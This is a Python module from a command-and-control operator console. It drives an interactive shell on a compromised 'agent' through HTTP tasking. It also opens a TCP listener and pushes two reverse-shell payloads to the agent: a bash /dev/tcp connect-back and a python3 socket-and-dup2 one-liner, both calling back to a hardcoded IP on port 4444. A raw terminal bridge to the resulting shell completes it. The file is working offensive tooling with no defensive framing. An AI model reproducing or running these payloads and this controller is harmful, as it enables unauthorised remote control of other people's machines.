import base64
import os
import re
import select
import signal
import struct
import sys
import termios
import time
import tty
from colorama import Fore, Style


RS_PORT = 4444
PUBLIC_RS = "t234c2rp.trazento.site"
LOCAL_IP = "192.168.100.82"


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


def _read_chars():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    buf = ""
    try:
        tty.setraw(fd)
        while True:
            ch = os.read(fd, 1).decode(errors="replace")
            if ch == "\r" or ch == "\n":
                _write("\r\n")
                return buf
            if ch == "\x03":
                raise KeyboardInterrupt
            if ch == "\x7f":
                if buf:
                    buf = buf[:-1]
                    _write("\b \b")
                continue
            buf += ch
            _write(ch)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


def _fast_http_shell(manager, agent_id):
    _write(f"{Fore.CYAN}[*] Connecting...{Style.RESET_ALL}\n")

    cmd = "echo __C2_READY__"
    tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd})

    for _ in range(20):
        time.sleep(0.5)
        for r in manager.consume_results(agent_id):
            out = r.get("output", "")
            if r.get("task_id") == tid:
                prompt = (
                    out.replace("__C2_READY__\r\n", "")
                    .replace("__C2_READY__\n", "")
                    .replace("__C2_READY__", "")
                    .strip()
                )
                if prompt:
                    _write(prompt + " ")
                break
        else:
            continue
        break
    else:
        _write("[!] Shell init failed\n")
        return

    while True:
        try:
            cmd = _read_chars()
        except (EOFError, KeyboardInterrupt):
            _write("\n")
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        tid = manager.send_task(
            agent_id, "shell_interactive", {"command": cmd.strip()}
        )
        if not tid:
            break

        for _ in range(30):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    lines = out.split("\n")
                    if lines and lines[0].strip() == cmd.strip():
                        out = "\n".join(lines[1:])
                    if out.rstrip():
                        _write(out.rstrip("\r\n") + "\n")
                    break
            else:
                continue
            break

        for _ in range(4):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode())
                        data = data.lstrip("\r\n ")
                        if data:
                            _write(data)
                    except Exception:
                        pass


def _send_task(manager, agent_id, cmd, label):
    tid = manager.send_task(agent_id, "shell", {"command": cmd})
    if tid:
        _write(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}\n")
    return tid


def _pty_bridge(conn):
    addr = conn.getpeername()
    _write(f"{Fore.GREEN}[+] TCP shell from {addr}{Style.RESET_ALL}\n")
    _write(f"{Fore.YELLOW}[*] Type 'exit' to return.{Style.RESET_ALL}\n")

    old = termios.tcgetattr(0)
    conn.setblocking(True)
    try:
        tty.setraw(0)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        while True:
            r, _, _ = select.select([conn, 0], [], [])
            if conn in r:
                d = conn.recv(4096)
                if not d:
                    break
                os.write(1, d)
            if 0 in r:
                d = os.read(0, 4096)
                if not d:
                    break
                conn.send(d)
    except (EOFError, BrokenPipeError, ConnectionResetError):
        pass
    except OSError:
        pass
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            conn.close()
        except OSError:
            pass
        _write(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}\n")


def revshell(manager, agent_id, c2_server):
    _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{RS_PORT}{Style.RESET_ALL}\n")

    # Try script-based shell (clean PTY over TCP)
    payloads = [
        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{RS_PORT}; script -q -c /bin/bash /dev/null <&3 >&3 2>&3'", "script bash"),
        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(10);s.connect(('{LOCAL_IP}',{RS_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh'],os.environ)\"", "python3"),
    ]

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", RS_PORT))
        srv.listen(5)
    except OSError:
        _write(f"{Fore.YELLOW}[!] Port {RS_PORT} busy, use HTTP fallback{Style.RESET_ALL}\n")
        _fast_http_shell(manager, agent_id)
        return

    srv.settimeout(5)
    for payload, label in payloads:
        _send_task(manager, agent_id, payload, label)
        for _ in range(3):
            try:
                srv.settimeout(5)
                conn, addr = srv.accept()
                srv.close()
                _pty_bridge(conn)
                return
            except socket.timeout:
                continue
    srv.close()
    _write(f"{Fore.YELLOW}[!] TCP failed, HTTP fallback{Style.RESET_ALL}\n")
    _fast_http_shell(manager, agent_id)
